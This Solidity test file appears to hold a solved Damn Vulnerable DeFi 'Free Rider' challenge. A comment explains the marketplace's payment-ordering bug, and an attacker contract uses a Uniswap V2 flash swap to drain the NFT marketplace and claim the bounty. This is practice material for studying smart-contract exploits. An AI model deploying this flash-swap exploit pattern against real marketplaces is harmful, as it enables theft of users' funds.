// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The FreeRiderNFTMarketplace._buyOne() has a critical bug on line 108:
         *   payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
         * 
         * This is called AFTER the NFT transfer, so ownerOf(tokenId) is now the BUYER,
         * not the seller! The marketplace pays the buyer instead of the seller.
         *
         * Additionally, buyMany() only checks if msg.value >= price ONCE but reuses
         * the same msg.value check for all purchases. So with just 15 ETH, you can
         * buy all 6 NFTs and get 90 ETH back (6 * 15 ETH payments to yourself).
         *
         * EXPLOIT STRATEGY:
         * 1. Flash swap 15 WETH from Uniswap V2 pair
         * 2. Unwrap WETH to ETH
         * 3. Buy all 6 NFTs with 15 ETH (marketplace pays us 90 ETH due to bug)
         * 4. Send NFTs to recoveryManager to claim 45 ETH bounty
         * 5. Repay flash swap (~15.05 WETH with 0.3% fee)
         * 6. Send remaining ETH to player
         */

        // Deploy attacker and execute the flash swap
        FreeRiderAttacker attacker = new FreeRiderAttacker(
            uniswapPair,
            weth,
            marketplace,
            nft,
            recoveryManager,
            player
        );
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

/**
 * @notice Attacker contract that uses flash swap to exploit the marketplace bug
 */
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private pair;
    WETH private weth;
    FreeRiderNFTMarketplace private marketplace;
    DamnValuableNFT private nft;
    FreeRiderRecoveryManager private recoveryManager;
    address private player;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    constructor(
        IUniswapV2Pair _pair,
        WETH _weth,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager,
        address _player
    ) {
        pair = _pair;
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        player = _player;
    }

    function attack() external {
        // Initiate flash swap for 15 WETH (token0 in the pair)
        // The data parameter being non-empty triggers the callback
        pair.swap(NFT_PRICE, 0, address(this), abi.encode("flash"));
    }

    // Called by Uniswap V2 pair during flash swap
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "Not pair");

        // Step 1: Unwrap WETH to ETH
        weth.withdraw(amount0);

        // Step 2: Buy all 6 NFTs with just 15 ETH (marketplace pays us back each time!)
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        // Step 3: Send all NFTs to recovery manager to claim bounty
        // The last NFT transfer triggers the bounty payment to player
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
        }

        // Step 4: Repay flash swap (amount + 0.3% fee)
        uint256 repayAmount = (amount0 * 1000 / 997) + 1;
        weth.deposit{value: repayAmount}();
        weth.transfer(address(pair), repayAmount);

        // Step 5: Send remaining ETH to player
        payable(player).transfer(address(this).balance);
    }

    // Required to receive NFTs
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // Required to receive ETH from marketplace and WETH unwrap
    receive() external payable {}
}
